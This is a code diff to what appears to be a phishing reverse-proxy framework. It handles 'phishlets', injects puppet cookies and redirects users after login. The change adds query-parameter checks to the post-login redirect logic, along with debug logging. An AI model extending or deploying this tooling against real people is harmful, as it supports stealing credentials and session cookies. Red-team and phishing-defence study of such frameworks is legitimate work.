@@ -20,6 +20,7 @@ from aiohttp import web, ClientSession, WSMsgType, TCPConnector
 from .helpers import *
 from .puppet import puppet_onrequest, puppet_onresponse, inject_puppet_cookies, get_puppet_cookies
 
+
 # --- COLORS ---
 ANSI_GREEN = "\033[92m"
 ANSI_YELLOW = "\033[93m"
@@ -3099,21 +3100,43 @@ async def proxy_handler(request):
                     redirect_on_host = phishlet_data.get('redirect_on_host', '').strip()
                     redirect_on_url = phishlet_data.get('redirect_on_url', '').strip()
                     after_login_url = phishlet_data.get('after_login_url', '').strip()
-                    
+                    redirect_on_param = phishlet_data.get('redirect_on_param', {})
                     if redirect_on_host and redirect_on_url and after_login_url:
                         # Check if current request matches the redirect conditions
                         current_host = target_host.strip().lower()
                         current_url = str(request.rel_url).strip()
-                        
-                        debug_log(f"Checking redirect conditions:", "DEBUG")
+                        # ONLY KEEP PATHS IN VARIBLE current_url
+                        current_url = current_url.split('?')[0].strip()
+                        debug_log(f"🎃 Checking redirect conditions:", "DEBUG")
                         debug_log(f"  redirect_on_host: '{redirect_on_host}' vs current_host: '{current_host}'", "DEBUG")
                         debug_log(f"  redirect_on_url: '{redirect_on_url}' vs current_url: '{current_url}'", "DEBUG")
                         
                         # Check if host and URL match (case-insensitive)
                         host_matches = redirect_on_host.lower() == current_host
                         url_matches = redirect_on_url.lower() == current_url.lower()
-                        
-                        if host_matches and url_matches:
+
+                        param_name = redirect_on_param.get('param', '').strip() 
+                        value_name= redirect_on_param.get('value', '').strip() 
+                        redirect_based_on_param = True
+
+                        debug_log(f"  Parameter check - param_name: '{param_name}', value_name: '{value_name}'", "DEBUG")
+                        debug_log(f"  Request query params: {dict(request.rel_url.query)}", "DEBUG")
+
+                        if param_name and value_name:
+                            redirect_based_on_param = False
+                            debug_log(f"  Parameter checking required, reset redirect_based_on_param to False", "DEBUG")
+                            # Get the actual parameter value from the query string
+                            actual_param_value = request.rel_url.query.get(param_name, '').strip()
+                            debug_log(f"  Checking if query param '{param_name}' has value '{value_name}'", "DEBUG")
+                            debug_log(f"  Actual value from query: '{actual_param_value}'", "DEBUG")
+                            if actual_param_value == value_name:
+                                redirect_based_on_param = True
+                                debug_log(f"  Parameter conditions met, set redirect_based_on_param to True", "DEBUG")
+                            else:
+                                debug_log(f"  Parameter conditions NOT met", "DEBUG")
+                       
+                        debug_log(f"  host_matches: {host_matches}, url_matches: {url_matches}, redirect_based_on_param: {redirect_based_on_param}", "DEBUG")
+                        if host_matches and url_matches and redirect_based_on_param:
                             debug_log(f"✅ Redirect conditions met! Redirecting to: {after_login_url}", "INFO")
                             
                             # Create redirect response
